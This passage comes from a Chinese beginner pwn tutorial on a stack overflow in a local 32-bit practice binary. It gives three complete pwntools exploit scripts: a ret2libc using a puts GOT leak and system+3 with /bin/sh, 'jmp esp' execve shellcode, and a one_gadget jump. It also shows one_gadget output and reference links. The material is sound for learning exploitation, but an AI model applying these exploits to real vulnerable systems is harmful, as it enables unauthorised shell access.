不过参数好像没办法控制,赋值为0的话就会断掉,这个方法希望有师傅能告诉我可行性怎么样(ps.好像网上没什么涉及到这个)
#####  0x8.6.2.1 system函数变形
gdb查看寄存器的地址:
`p $esp`
修改寄存器的值:
`set $esp=0x`
查看汇编:
`telescope 8 $esp`
我们之间修改地址为`lib.symbols['system'] + 3`,这样子就可以绕过了。
然后布置好栈让函数不要出错就行了
    #!/usr/bin/env python
    # -*- coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln6')
    elf = ELF('./vuln6')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    # vuln address
    SayHello = elf.symbols['SayHello']
    # 程序的got表地址
    libc_start_main_got = elf.got['__libc_start_main']
    # 方法2利用pwntool的ELF模块之间获取
    lib_start_main = lib.symbols['__libc_start_main']
    start = 0x8048370
    # system的地址
    log.success("SayHello:" + str(hex(SayHello)))
    log.success("system:" + str(hex(lib.symbols['system'])))
    # 这里开始调试
    gdb.attach(io,'b *0x08048486')
    pause()
    # 利用栈溢出调用puts函数泄漏got表地址
    payload1 = 'A'*0x16 + p32(elf.plt['puts']) + p32(SayHello) + p32(libc_start_main_got)
    # payload1 = 'A'*0x16 + 'B'*4
    # 格式化字符串可以利用栈上的残留来获取
    io.sendlineafter('hell', payload1)
    # 有时候没办法获取的时候加多一个,因为可能有一些垃圾数据
    print("start")
    print(io.recvuntil('n'))
    print("end")
    lib_main = u32(io.recvline()[0:4])
    libc_base = lib_main - lib_start_main
    log.success("libc_base:" + str(hex(libc_base)))
    # 经典retlibc利用公式
    retAddress = p32(0xdeadbeef)
    system = libc_base + lib.symbols['system'] + 3
    # gets = libc_base + lib.symbols['gets']
    binsh = libc_base + lib.search("/bin/sh").next()
    # oneShell = libc_base + 0x67a7f
    payload2 = 'A'*0x16 + p32(system) + p32(start) + p32(binsh)*10
    io.sendlineafter('hello', payload2)
    io.interactive()
#####  0x8.6.2.2 shellcode变形绕过
这里没开nx保护,修改下shellcode去除0xb符号即可
    #!/usr/bin/env python
    # -*- coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln6')
    elf = ELF('./vuln6')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    # vuln address
    SayHello = elf.symbols['SayHello']
    # 程序的got表地址
    libc_start_main_got = elf.got['__libc_start_main']
    # 方法2利用pwntool的ELF模块之间获取
    lib_start_main = lib.symbols['__libc_start_main']
    log.success("SayHello:" + str(hex(SayHello)))
    # 这里开始调试
    gdb.attach(io,'b *0x08048486')
    pause()
    # 利用栈溢出调用puts函数泄漏got表地址
    payload1 = 'A'*0x16 + p32(elf.plt['puts']) + p32(SayHello) + p32(libc_start_main_got)
    # payload1 = 'A'*0x16 + 'B'*4
    # 格式化字符串可以利用栈上的残留来获取
    io.sendlineafter('hell', payload1)
    # 有时候没办法获取的时候加多一个,因为可能有一些垃圾数据
    print("start")
    print(io.recvuntil('n'))
    print("end")
    lib_main = u32(io.recvline()[0:4])
    libc_base = lib_main - lib_start_main
    log.success("libc_base:" + str(hex(libc_base)))
    # 经典retlibc利用公式
    retAddress = p32(0xdeadbeef)
    gets = libc_base + lib.symbols['gets']
    # binsh = libc_base + lib.search("/bin/sh").next()
    payload = '''
    xor    eax,eax
    xor    ecx, ecx
    push   eax
    push   0x68732f6e
    push   0x69622f2f
    mov    ebx,esp
    push   eax
    mov    edx,esp
    push   ebx
    mov    al,0x11
    dec    al
    dec    al
    dec    al
    dec    al
    dec    al
    dec    al
    int    0x80
    '''
    jmpesp = libc_base + lib.search(asm('jmp esp')).next()
    payload2 = 'A'*0x16 + p32(jmpesp) + asm(payload)
    io.sendlineafter('hello', payload2)
    io.interactive()
#####  0x8.6.2.3 Onegadget技术
我们在libc下寻找下Onegadget
利用:`one_gadget`工具
`one_gadget /lib/i386-linux-gnu/libc.so.6`
    root@mypwn:/ctf/work/MiniPWN/article# one_gadget /lib/i386-linux-gnu/libc.so.6
    0x3d0d3 execve("/bin/sh", esp+0x34, environ)
    constraints:
      esi is the GOT address of libc
      [esp+0x34] == NULL
    0x3d0d5 execve("/bin/sh", esp+0x38, environ)
    constraints:
      esi is the GOT address of libc
      [esp+0x38] == NULL
    0x3d0d9 execve("/bin/sh", esp+0x3c, environ)
    constraints:
      esi is the GOT address of libc
      [esp+0x3c] == NULL
    0x3d0e0 execve("/bin/sh", esp+0x40, environ)
    constraints:
      esi is the GOT address of libc
      [esp+0x40] == NULL
    0x67a7f execl("/bin/sh", eax)
    constraints:
      esi is the GOT address of libc
      eax == NULL
    0x67a80 execl("/bin/sh", [esp])
    constraints:
      esi is the GOT address of libc
      [esp] == NULL
    0x137e5e execl("/bin/sh", eax)
    constraints:
      ebx is the GOT address of libc
      eax == NULL
    0x137e5f execl("/bin/sh", [esp])
    constraints:
      ebx is the GOT address of libc
      [esp] == NULL
我们挑选一些条件比较容易满足的,0x67a7f 这个条件是满足的。
exp.py
    #!/usr/bin/env python
    # -*- coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    context(arch='i386', os='linux')
    # 设置tmux程序
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
    # program module
    io = process('./vuln6')
    elf = ELF('./vuln6')
    lib = ELF("/lib/i386-linux-gnu/libc.so.6")
    # vuln address
    SayHello = elf.symbols['SayHello']
    # 程序的got表地址
    libc_start_main_got = elf.got['__libc_start_main']
    # 方法2利用pwntool的ELF模块之间获取
    lib_start_main = lib.symbols['__libc_start_main']
    log.success("SayHello:" + str(hex(SayHello)))
    # 这里开始调试
    gdb.attach(io,'b *0x08048486')
    pause()
    # 利用栈溢出调用puts函数泄漏got表地址
    payload1 = 'A'*0x16 + p32(elf.plt['puts']) + p32(SayHello) + p32(libc_start_main_got)
    # payload1 = 'A'*0x16 + 'B'*4
    # 格式化字符串可以利用栈上的残留来获取
    io.sendlineafter('hell', payload1)
    # 有时候没办法获取的时候加多一个,因为可能有一些垃圾数据
    print("start")
    print(io.recvuntil('n'))
    print("end")
    lib_main = u32(io.recvline()[0:4])
    libc_base = lib_main - lib_start_main
    log.success("libc_base:" + str(hex(libc_base)))
    # 经典retlibc利用公式
    retAddress = p32(0xdeadbeef)
    gets = libc_base + lib.symbols['gets']
    # binsh = libc_base + lib.search("/bin/sh").next()
    oneShell = libc_base + 0x67a7f
    payload2 = 'A'*0x16 + p32(oneShell)
    io.sendlineafter('hello', payload2)
    io.interactive()
###  0x8.7 高级ROP
这个学习的话,还是得从原理开始慢慢分析,我会在下一遍文章开始讲解,顺便介绍一下绕过各种保护的经典情况。
## 0x9 总结
      自己学pwn也有好一些日子了,学完高级ROP的内容,就可以开始PWN的堆方面学习了,自己还是很菜,还得继续努力才行.
ps.本人建立了一个PWN萌新QQ交流群,专门给萌新提供一个良好的解决问题平台,同时也能提高自己。欢迎加入:OTE1NzMzMDY4 (base64)
## 0xA 参考链接
[和媳妇一起学Pwn 之
Start](https://xuanxuanblingbling.github.io/ctf/pwn/2019/08/30/start/)
[程序内存空间（代码段、数据段、堆栈段）](https://blog.csdn.net/ywcpig/article/details/52303745)
[x86内存框架简介](https://blog.csdn.net/yzy1103203312/article/details/75207918)
[PIE保护详解和常用bypass手法](https://xz.aliyun.com/t/6922)
[ctf pwn中的缓解机制及其原理](http://eternalsakura13.com/2018/03/25/aslr/)
[ASLR和PIE的区别](https://blog.csdn.net/spenghui/article/details/79910884)
[elf文件格式和运行时内存布局](http://blog.sina.com.cn/s/blog_4ed962ae01013vhr.html)
[PIE保护详解和常用bypass手段](https://www.anquanke.com/post/id/177520)
[Linux之so加载原理分析](https://blog.csdn.net/sauphy/article/details/50121163)
[PWN菜鸡入门之栈溢出 （2）——
ret2libc与动态链接库的关系](https://www.cnblogs.com/pwn2web/p/10352024.html)